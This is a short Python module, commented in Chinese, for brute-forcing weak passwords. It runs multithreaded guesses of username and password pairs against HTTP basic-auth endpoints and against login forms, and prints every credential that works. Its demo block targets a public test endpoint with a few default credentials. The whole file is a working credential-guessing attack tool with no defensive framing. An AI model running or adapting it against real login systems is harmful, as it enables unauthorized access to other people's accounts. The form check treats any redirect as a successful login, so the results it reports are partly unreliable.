#!/usr/bin/env python3
"""
弱口令爆破模块 - 支持HTTP基础认证和表单登录
"""

import requests
from requests.auth import HTTPBasicAuth
import threading
from colorama import Fore, Style


def brute_http_basic(url, usernames, passwords, threads_num=20):
    """
    HTTP基础认证爆破
    """
    results = []

    def test(username, password):
        try:
            resp = requests.get(url, auth=HTTPBasicAuth(username, password), timeout=5)
            if resp.status_code == 200:
                results.append((username, password))
                print(f"{Fore.GREEN}[+] 找到密码: {username}:{password}{Style.RESET_ALL}")
        except:
            pass

    threads = []
    for username in usernames:
        for password in passwords:
            t = threading.Thread(target=test, args=(username, password))
            threads.append(t)
            t.start()

            if len(threads) >= threads_num:
                for t in threads:
                    t.join()
                threads = []

    for t in threads:
        t.join()

    return results


def brute_form(url, username_field, password_field, usernames, passwords, success_indicator, threads_num=20):
    """
    表单登录爆破
    url: 登录表单提交地址
    username_field: 用户名表单字段名
    password_field: 密码表单字段名
    success_indicator: 登录成功的特征字符串（如"dashboard"）
    """
    results = []

    def test(username, password):
        try:
            data = {username_field: username, password_field: password}
            resp = requests.post(url, data=data, timeout=5, allow_redirects=False)

            if success_indicator in resp.text or resp.status_code == 302:
                results.append((username, password))
                print(f"{Fore.GREEN}[+] 找到密码: {username}:{password}{Style.RESET_ALL}")
        except:
            pass

    threads = []
    for username in usernames:
        for password in passwords:
            t = threading.Thread(target=test, args=(username, password))
            threads.append(t)
            t.start()

            if len(threads) >= threads_num:
                for t in threads:
                    t.join()
                threads = []

    for t in threads:
        t.join()

    return results


if __name__ == '__main__':
    # 测试代码
    users = ['admin', 'root', 'test']
    passwd = ['123456', 'admin', 'password']
    results = brute_http_basic('https://httpbin.org/basic-auth/admin/123456', users, passwd)
    print(f"找到 {len(results)} 个有效密码")